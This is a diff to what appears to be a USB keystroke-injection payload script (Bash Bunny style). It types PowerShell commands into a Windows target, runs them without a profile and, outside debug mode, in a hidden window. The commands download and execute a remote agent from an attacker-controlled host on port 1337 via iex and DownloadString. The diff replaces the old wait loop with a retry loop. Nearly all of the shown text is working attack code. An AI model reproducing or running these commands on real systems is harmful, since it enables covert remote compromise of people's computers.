@@ -41,10 +41,14 @@ Q ALT Y
 Q DELAY 2000
 Q ENTER
 if [ $DEBUG ]; then
-    Q STRING "powershell -NonI -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337 -verbose\""
+    ### Old Powershell command
+    # Q STRING "powershell -NonI -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337 -verbose\""
+    Q STRING "powershell -NonI -NoP -C \"\$p='192.168.1.136';\$ic=1;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');Invoke-bbAgent \$p 1337 -verbose;exit}catch{\$ic++}}else{\$ic++}sleep -s 2}\""
     Q ENTER
 else
-    Q STRING "powershell -NonI -W Hidden -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337\""
+    ### Old Powershell command
+    # Q STRING "powershell -NonI -W Hidden -NoP -C \"while((test-connection '172.16.64.1' -count 1 -quiet) -eq \$false){sleep -s 2}sleep -s 3;iex (new-object net.webclient).DownloadString('http://172.16.64.1:1337/getAgent');Invoke-bbAgent 172.16.64.1 1337\""
+    Q STRING "powershell -NonI -W Hidden -NoP -C \"\$p='192.168.1.136';\$ic=1;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');Invoke-bbAgent \$p 1337;exit}catch{\$ic++}}else{\$ic++}sleep -s 2}\""
     Q ENTER
 fi
 
